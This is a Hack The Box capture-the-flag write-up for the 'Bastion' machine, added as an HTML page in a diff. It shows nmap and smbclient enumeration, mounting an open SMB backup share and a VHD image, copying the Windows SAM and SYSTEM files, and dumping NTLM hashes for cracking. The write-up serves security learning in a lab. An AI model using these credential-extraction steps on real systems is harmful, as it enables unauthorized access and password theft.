@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Bastion</strong></h1>
+        <em>Released: 27th April 2019 / Pwned: May 25th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Bastion is fun! It's a simple but realistic box that I thought was designed really well.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.134</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;10.10.10.134<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-05-22&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>35&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.134<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.040s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;996&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;for_Windows_7.9&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18&nbsp;(ED25519)<br>
+                135/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                139/tcp&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;open&nbsp;&nbsp;microsoft-ds&nbsp;Windows&nbsp;Server&nbsp;2016&nbsp;Standard&nbsp;14393&nbsp;microsoft-ds<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                TCP/IP&nbsp;fingerprint:<br>
+                ...<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;28.33&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        The first service to check is netbios-ssn on port 139, and look for any files.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) netbios</strong></h2><br>
+        Have a look at the network shares using <code>smbclient</code>, and connect to the <code>Backups</code> share. There's a note...<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span>139smb#&nbsp;smbclient&nbsp;-L&nbsp;10.10.10.134<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <br>
+                Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;Admin<br>
+                Backups&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default&nbsp;share<br>
+                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;IPC<br>
+                Reconnecting&nbsp;with&nbsp;SMB1&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">workgroup</span>&nbsp;listing.<br>
+                do_connect:&nbsp;Connection&nbsp;to&nbsp;10.10.10.134&nbsp;failed&nbsp;(Error&nbsp;NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>
+                Failed&nbsp;to&nbsp;connect&nbsp;with&nbsp;SMB1&nbsp;--&nbsp;no&nbsp;workgroup&nbsp;available<br>
+                root@gotham:~/ctf/bastion/139smb#&nbsp;smbclient&nbsp;//10.10.10.134/Backups<br>
+                Enter&nbsp;WORKGROUP\root's&nbsp;password:&nbsp;<br>
+                Try&nbsp;"help"&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb:&nbsp;\&gt;&nbsp;ls<br>
+                &nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;May&nbsp;22&nbsp;14:00:46&nbsp;2019<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;May&nbsp;22&nbsp;14:00:46&nbsp;2019<br>
+                &nbsp;&nbsp;note.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;116&nbsp;&nbsp;Tue&nbsp;Apr&nbsp;16&nbsp;11:10:09&nbsp;2019<br>
+                &nbsp;&nbsp;remotenote.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;116&nbsp;&nbsp;Wed&nbsp;May&nbsp;22&nbsp;13:51:55&nbsp;2019<br>
+                &nbsp;&nbsp;WindowsImageBackup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Fri&nbsp;Feb&nbsp;22&nbsp;12:44:02&nbsp;2019<br>
+                <br>
+                7735807&nbsp;blocks&nbsp;of&nbsp;size&nbsp;4096.&nbsp;2780226&nbsp;blocks&nbsp;available<br>
+                smb:&nbsp;\&gt;&nbsp;get&nbsp;note.txt<br>
+                getting&nbsp;file&nbsp;\note.txt&nbsp;of&nbsp;size&nbsp;116&nbsp;as&nbsp;note.txt&nbsp;(0.7&nbsp;KiloBytes/sec)&nbsp;(average&nbsp;0.7&nbsp;KiloBytes/sec)<br>
+                smb:&nbsp;\&gt;&nbsp;exit<br>
+                root@gotham:~/ctf/bastion/139smb#&nbsp;cat&nbsp;note.txt&nbsp;<br>
+                <br>
+                Sysadmins:&nbsp;please&nbsp;don't&nbsp;transfer&nbsp;the&nbsp;entire&nbsp;backup&nbsp;file&nbsp;locally,&nbsp;the&nbsp;VPN&nbsp;to&nbsp;the&nbsp;subsidiary&nbsp;office&nbsp;is&nbsp;too&nbsp;slow.
+            </div>
+        </div><br>
+        <br>
+        <code>note.txt</code> is a hint that you shouldn't try to download any files from the share, as you'll struggle when it comes to the larger ones. Instead, I think the creator intends for you to network mount the share and browse it remotely.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Mount netbios share &amp; browse</strong></h2><br>
+        Network mount the share using <code>mount -t cifs</code>. There's no password required because NULL sessions are enabled.<br>
+        You might have to <code>apt install cifs-utils</code> to be able to mount the share (I did).<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span>139smb#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span>139smb#&nbsp;<span style="color:#ff9d00;font-weight:700">mount</span>&nbsp;-t&nbsp;cifs&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>10.10.10.134<span style="color:#ff9d00;font-weight:700">/</span>Backups&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<br>
+                Password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">root</span>@//10.10.10.134/Backups:&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Browsing the mounted samba share, you see that there's a windows backup.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span>139smb#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                note.txt&nbsp;&nbsp;SDT65CB.tmp&nbsp;&nbsp;WindowsImageBackup<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;WindowsImageBackup<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                L4mpje-PC<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;L4mpje-PC<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup<span style="color:#ff9d00;font-weight:700">/</span>L4mpje-PC#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                <span style="color:#3ad900;font-weight:400">'Backup&nbsp;2019-02-22&nbsp;124351'</span>&nbsp;&nbsp;&nbsp;Catalog&nbsp;&nbsp;&nbsp;MediaId&nbsp;&nbsp;&nbsp;SPPMetadataCache<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup<span style="color:#ff9d00;font-weight:700">/</span>L4mpje-PC#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Backup<span style="color:#333333;font-weight:400">\&nbsp;</span>2019-02-22<span style="color:#333333;font-weight:400">\&nbsp;</span>124351<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup<span style="color:#ff9d00;font-weight:700">/</span>L4mpje-PC<span style="color:#ff9d00;font-weight:700">/</span>Backup&nbsp;2019-02-22&nbsp;124351#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l<br>
+                total&nbsp;5330560<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;37761024&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;5418299392&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1186&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;BackupSpecs.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1078&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8930&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6542&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2894&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1488&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1484&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3844&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3988&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7110&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;2374620&nbsp;Feb&nbsp;22&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+            </div>
+        </div><br>
+        <br>
+        On the share there's a 5gb virtual hard disk (vhd) which I'm guessing is the backed-up file system.<br>
+        You can network mount this <code>.vhd</code> file too.<br>
+        <br>
+        Make a directory to mount it to in <code>/mnt</code> and mount it using <code>guestmount</code>.<br>
+        For <code>guestmount</code> you might need to install lifguestfs-tools - <code>apt install libguestfs-tools</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup<span style="color:#ff9d00;font-weight:700">/</span>L4mpje-PC<span style="color:#ff9d00;font-weight:700">/</span>Backup&nbsp;2019-02-22&nbsp;124351#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>vhd2<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>bastionBackups<span style="color:#ff9d00;font-weight:700">/</span>WindowsImageBackup<span style="color:#ff9d00;font-weight:700">/</span>L4mpje-PC<span style="color:#ff9d00;font-weight:700">/</span>Backup&nbsp;2019-02-22&nbsp;124351#&nbsp;guestmount&nbsp;--add&nbsp;9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&nbsp;--ro&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>vhd2&nbsp;-m&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>sda1
+            </div>
+        </div><br>
+        <br>
+        <code>cd</code> to <code>/mnt/vhd2</code> to browse the virtual hard disk.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) SAM</strong></h2><br>
+        This <code>.vhd</code> is a backup of the filesystem and not a currently running OS, which means that we can access Windows' SAM file which stores system passwords.<br>
+        <br>
+        Whilst browsing the <code>.vhd</code>, get the SAM and SYSTEM files - they're located in <code>Windows/System32/config/</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>vhd2<span style="color:#ff9d00;font-weight:700">/</span>Windows<span style="color:#ff9d00;font-weight:700">/</span>System32<span style="color:#ff9d00;font-weight:700">/</span>config#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;SAM&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>vhd2<span style="color:#ff9d00;font-weight:700">/</span>Windows<span style="color:#ff9d00;font-weight:700">/</span>System32<span style="color:#ff9d00;font-weight:700">/</span>config#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;SYSTEM&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion
+            </div>
+        </div><br>
+        <br>
+        Retrieve the hashes from the SAM file using <code>samdump2</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>vhd2<span style="color:#ff9d00;font-weight:700">/</span>Windows<span style="color:#ff9d00;font-weight:700">/</span>System32<span style="color:#ff9d00;font-weight:700">/</span>config#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;samdump2&nbsp;SYSTEM&nbsp;SAM<br>
+                *disabled*&nbsp;Administrator<span style="color:#ff9d00;font-weight:700">:</span>500<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>31d6cfe0d16ae931b73c59d7e0c089c0<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                *disabled*&nbsp;Guest<span style="color:#ff9d00;font-weight:700">:</span>501<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>31d6cfe0d16ae931b73c59d7e0c089c0<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                L4mpje<span style="color:#ff9d00;font-weight:700">:</span>1000<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>26112010952d963c8dc4217daec986d9<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;samdump2&nbsp;SYSTEM&nbsp;SAM&nbsp;&gt;&nbsp;samHashes.txt
+            </div>
+        </div><br>
+        <br>
+        Here, the password hash is the last part of the entry e.g. L4mpje's password hash is → 26112010952d963c8dc4217daec986d9<br>
+        Copy paste that into its own file - l4mpjeHash.txt<br>
+        <br>
+        The hash is an NTLM / NTHash, so find its ID in hashcat and then crack it.<br>
+        Alternatively, just hashkiller :) - <a href="https://hashkiller.co.uk/Cracker/NTLM">https://hashkiller.co.uk/Cracker/NTLM</a><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;hashcat&nbsp;-h&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;-i&nbsp;lm<br>
+                &nbsp;&nbsp;&nbsp;5500&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NetNTLMv1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Network&nbsp;Protocols<br>
+                &nbsp;&nbsp;&nbsp;5500&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NetNTLMv1+ESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Network&nbsp;Protocols<br>
